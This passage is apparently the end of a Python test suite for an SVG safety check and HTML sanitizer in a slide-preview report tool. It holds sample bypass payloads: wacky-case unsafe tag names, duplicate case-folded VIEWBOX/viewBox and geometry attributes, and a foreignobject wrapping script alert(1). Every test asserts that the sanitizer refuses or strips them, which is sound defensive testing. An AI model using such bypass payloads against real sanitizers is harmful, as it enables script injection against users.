    #      every wacky-case variant and let a contained <script>
    #      execute. Bundled enumeration over each unsafe tag and a
    #      handful of case mutations; every variant must be refused
    #      and the legit hex-only baseline must still pass.
    case_variant_payloads = []
    # Tag names in their canonical SVG (camelCase) form. Each is
    # exercised below as lower-case, UPPER-case, and a deliberately
    # alternating wacky case.
    canonical_unsafe = [
        "script", "foreignObject", "use", "a", "style",
        "animate", "animateMotion", "animateTransform", "set",
        "discard", "mpath", "feImage",
    ]

    def _wacky_case(s: str) -> str:
        return "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(s)
        )

    for name in canonical_unsafe:
        for case_variant in (
            name.lower(),
            name.upper(),
            _wacky_case(name),
        ):
            svg = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                f'<svg xmlns="{SVG_NS}" viewBox="0 0 100 100" '
                f'width="100" height="100">'
                f'<{case_variant}/>'
                '</svg>'
            )
            case_variant_payloads.append((svg, case_variant))
    # Plus a baseline-clean positive that the case-fold check did
    # not over-refuse.
    case_variant_payloads.append((
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<svg xmlns="{SVG_NS}"><rect fill="#FFFFFF"/></svg>',
        "POSITIVE: clean SVG still accepted",
    ))
    case_correct = True
    case_failures: list[str] = []
    for svg, label in case_variant_payloads:
        ret_root, _reason = _svg_safety_check(svg)
        is_positive = label.startswith("POSITIVE")
        if is_positive:
            if ret_root is None:
                case_correct = False
                case_failures.append(
                    f"{label}: legitimate SVG was refused"
                )
        else:
            if ret_root is not None:
                case_correct = False
                case_failures.append(
                    f"<{label}> case-variant was accepted"
                )
    results.append(_scenario(
        "safety check: case-variant element-name bypasses "
        "(lowercase / UPPERCASE / wacky-case forms of every unsafe "
        "tag: script, foreignObject, use, a, style, animate, "
        "animateMotion, animateTransform, set, discard, mpath, "
        "feImage) all refused; clean hex-only SVG still accepted",
        case_correct,
        "; ".join(case_failures),
    ))

    # 39a-bis. Case-variant SVG geometry attributes: an out-of-canvas
    #          <rect X="3000" Y="3000" WIDTH="5000" HEIGHT="5000"/>
    #          (uppercase attribute names) must still trip the
    #          `out_of_canvas_svg` per-slide ERROR. HTML5 lowercases
    #          most SVG geometry attribute names when the SVG is
    #          inlined into an HTML host, so a case-sensitive
    #          attrib.get("x") would miss the bypass while the browser
    #          still rendered the rectangle outside the canvas.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        bad_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect X="3000" Y="3000" WIDTH="5000" HEIGHT="5000" fill="red"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(bad_svg, encoding="utf-8")
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = _has_finding(slide, "out_of_canvas_svg")
        results.append(_scenario(
            "out-of-canvas SVG geometry with UPPERCASE attribute names "
            "(<rect X=\"...\" Y=\"...\" WIDTH=\"...\" HEIGHT=\"...\">) still "
            "trips the out_of_canvas_svg gate",
            ok,
            f"errors={[f.name for f in slide.errors]}",
        ))

    # 39a-bis2. Duplicate-case geometry attribute bypass. XML keeps
    #           both `<rect X="3000" ... x="0" .../>` attributes; an
    #           HTML host's first-wins case-fold resolution picks
    #           the uppercase (out-of-canvas) value, but a naive
    #           "last write wins" dict-build in the validator would
    #           collapse to the safe lowercase value. The geometry
    #           walk now refuses any element carrying two attributes
    #           that collapse to the same case-folded name.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        bad_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect X="3000" Y="3000" WIDTH="5000" HEIGHT="5000" '
            'x="0" y="0" width="100" height="100" fill="red"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(bad_svg, encoding="utf-8")
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = (
            _has_finding(slide, "out_of_canvas_svg")
            and any(
                "duplicate case-folded attribute" in f.detail
                for f in slide.errors
            )
        )
        results.append(_scenario(
            "out-of-canvas SVG geometry with DUPLICATE case-folded "
            "attributes (<rect X=\"...\" x=\"...\" WIDTH=\"...\" "
            "width=\"...\"/>) still trips the out_of_canvas_svg gate",
            ok,
            f"errors={[(f.name, f.detail[:60]) for f in slide.errors]}",
        ))

    # 39a-bis3. Root-level duplicate-case attribute bypass. An
    #           SVG whose <svg> root carries both `VIEWBOX="..."` and
    #           `viewBox="..."` would, under HTML5's first-wins
    #           case-fold resolution, render with the attacker-
    #           controlled canvas size — and a case-sensitive
    #           attrib.get("viewBox") lookup would only see the safe
    #           value. The duplicate-case attribute scan walks every
    #           element (including the root), so the per-slide
    #           ERROR must surface even though the duplicate sits
    #           on the SVG root rather than on a geometry element.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        bad_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'VIEWBOX="0 0 99999 99999" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect x="0" y="0" width="100" height="100" fill="#FFFFFF"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(bad_svg, encoding="utf-8")
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = (
            _has_finding(slide, "out_of_canvas_svg")
            and any(
                "duplicate case-folded attribute" in f.detail
                and "<svg>" in f.detail
                for f in slide.errors
            )
        )
        results.append(_scenario(
            "out-of-canvas SVG geometry: DUPLICATE case-folded "
            "attributes on the <svg> root (VIEWBOX + viewBox) still "
            "trip the out_of_canvas_svg gate",
            ok,
            f"errors={[(f.name, f.detail[:80]) for f in slide.errors]}",
        ))

    # 39c. End-to-end HTML output: a workspace SVG whose <svg> root
    #      carries `VIEWBOX="..." viewBox="..."` (duplicate
    #      case-folded attribute on the root) must be refused by the
    #      inline-HTML sanitizer. Neither attribute may appear in the
    #      produced HTML body (the contact sheet would otherwise let
    #      an attacker override the SVG canvas via HTML5's first-wins
    #      case-fold resolution), and the fallback notice must be
    #      shown on the slide's card.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        bad_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'VIEWBOX="0 0 99999 99999" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect x="0" y="0" width="100" height="100" fill="#FFFFFF"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(bad_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        body = text.split("</head>", 1)[-1]
        ok = (
            "VIEWBOX=" not in body
            and "99999" not in body
            and "SVG not embedded" in body
            and "duplicate case-folded attribute" in body
        )
        results.append(_scenario(
            "HTML output: root-level duplicate case-folded attribute "
            "(<svg VIEWBOX=\"...\" viewBox=\"...\">) refused at the "
            "inline-HTML sanitizer (no VIEWBOX= / 99999 in HTML body, "
            "fallback shown)",
            ok,
            f"VIEWBOX_in_body={'VIEWBOX=' in body}, "
            f"99999_in_body={'99999' in body}, "
            f"fallback_shown={'SVG not embedded' in body}",
        ))

    # 39b. End-to-end HTML output: a workspace SVG carrying
    #      <foreignobject> (lowercase) with an inner <script> must
    #      not let either the foreign-object tag or the script tag
    #      appear in the produced HTML. This is the specific bypass
    #      Codex flagged.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<foreignobject><script>alert(1)</script></foreignobject>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        # Neither tag should land in the produced HTML.
        ok = (
            "<foreignobject" not in text.lower()
            and "<script" not in text.lower()
            and "alert(1)" not in text
            and "SVG not embedded" in text
        )
        results.append(_scenario(
            "HTML output: lowercase <foreignobject> (with nested "
            "<script>) refused (no <foreignobject / <script / "
            "alert(1) substring in produced HTML; fallback shown)",
            ok,
            f"foreignobject_in_html={'<foreignobject' in text.lower()}, "
            f"script_in_html={'<script' in text.lower()}, "
            f"alert_in_html={'alert(1)' in text}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 41. End-to-end HTML output: a workspace SVG with an <image> whose
    #     href is a legitimate workspace-relative local path (the exact
    #     shape generate_svg_previews.py emits for an image_slot) must
    #     have its href / src / xlink:href stripped from the inlined
    #     HTML body. The path passes local_path_is_safe (no scheme, no
    #     '..', no leading '/', no '\\'), but the inlined SVG still
    #     resolves the path against the HTML host directory — which the
    #     output gate requires to be OUTSIDE the workspace by design.
    #     So the browser would 404 against the local filesystem on
    #     open; the contact sheet promises NOT to fetch anything when
    #     opened, so the strip step removes the fetchable surface
    #     entirely. The <image> element's geometry (x / y / width /
    #     height) must survive so the slide outline is still visible.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        legit_image_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'xmlns:xlink="http://www.w3.org/1999/xlink" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image href="generated_assets/cover.png" '
            'x="100" y="200" width="800" height="450"/>'
            '<image xlink:href="generated_assets/inset.png" '
            'src="generated_assets/inset.png" '
            'x="100" y="700" width="400" height="200"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(
            legit_image_svg, encoding="utf-8",
        )
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        # The HTML head <style> block is hand-written and contains no
        # href / src attributes. Scope the assertion to the body.
        body_split = text.split("</style></head>", 1)
        body = body_split[1] if len(body_split) == 2 else text
        # Geometry on the <image> element survives; the fetchable
        # attributes do not. Match both bare local-path values (the
        # raw spelling) AND any href/src attribute at all on the
        # inlined <image>.
        ok = (
            "<image " in body  # element still inlined (geometry preserved)
            and 'x="100"' in body
            and 'width="800"' in body
            and "generated_assets/cover.png" not in body
            and "generated_assets/inset.png" not in body
            and ' href="' not in body  # no href attribute on any element
            and ' src="' not in body
            and "xlink:href=" not in body
            and "SVG not embedded" not in body  # SVG inlined, not refused
        )
        image_inlined = "<image " in body
        href_in_body = ' href="' in body
        src_in_body = ' src="' in body
        xlink_in_body = "xlink:href=" in body
        cover_path_in_body = "generated_assets/cover.png" in body
        inset_path_in_body = "generated_assets/inset.png" in body
        results.append(_scenario(
            "HTML output: legitimate workspace-relative <image href=..."
            "> / xlink:href / src attributes are STRIPPED from the "
            "inlined SVG so the contact sheet never fetches anything "
            "from the HTML host directory (geometry preserved, "
            "fetchable surface removed)",
            ok,
            f"image_inlined={image_inlined}, "
            f"href_in_body={href_in_body}, "
            f"src_in_body={src_in_body}, "
            f"xlink_in_body={xlink_in_body}, "
            f"cover_path_in_body={cover_path_in_body}, "
            f"inset_path_in_body={inset_path_in_body}",
        ))

    # 42. Direct unit-test of _strip_fetchable_attrs: every href / src
    #     / xlink:href / data-href / formhref variant on every element
    #     in the tree must be removed; other attributes must survive.
    import xml.etree.ElementTree as ET_unit  # localized import
    strip_svg = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<image href="a.png" x="1" y="2" width="3" height="4"/>'
        '<image xlink:href="b.png" x="5" y="6"/>'
        '<image src="c.png"/>'
        '<g data-href="d.png"><rect x="0" y="0"/></g>'
        '<image FormHref="e.png"/>'
        '</svg>'
    )
    strip_root = ET_unit.fromstring(strip_svg)
    _strip_fetchable_attrs(strip_root)
    serialized = ET_unit.tostring(strip_root, encoding="unicode")
    ok = (
        # every reference attribute removed (case-insensitive)
        "href" not in serialized.lower()
        and "src" not in serialized.lower()
        # geometry survives
        and 'x="1"' in serialized
        and 'width="3"' in serialized
        and "<rect" in serialized
    )
    href_in_serialized = "href" in serialized.lower()
    src_in_serialized = "src" in serialized.lower()
    geometry_survives = 'x="1"' in serialized and 'width="3"' in serialized
    results.append(_scenario(
        "unit: _strip_fetchable_attrs removes every href / src / "
        "xlink:href / data-href / FormHref on every element; "
        "non-reference attributes survive",
        ok,
        f"href_in_serialized={href_in_serialized}, "
        f"src_in_serialized={src_in_serialized}, "
        f"geometry_survives={geometry_survives}",
    ))

    # 40. Defensive: an SVG containing a processing instruction inside
    #     the element tree must not crash _svg_safety_check (ET
    #     represents PIs as Element objects with a callable `tag`).
    #     PIs cannot host fetchable content (the XML declaration and
    #     stylesheet PIs are siblings of the root, dropped by
    #     ET.tostring), but a defensive non-string-tag skip protects
    #     against any future shape that puts one inside the tree.
    pi_svg = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<?some-pi data="x"?>'
        '<rect x="0" y="0" width="100" height="100" fill="#FFFFFF"/>'
        '</svg>'
    )
    crashed = False
    try:
        pi_root, pi_reason = _svg_safety_check(pi_svg)
    except Exception as exc:
        crashed = True
        pi_reason = f"{type(exc).__name__}: {exc}"
        pi_root = None
    ok = not crashed and pi_root is not None
    results.append(_scenario(
        "safety check: SVG with a processing instruction inside the "
        "element tree does not crash (non-string tag handled defensively)",
        ok,
        f"crashed={crashed}, reason={pi_reason!r}",
    ))

    return results


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
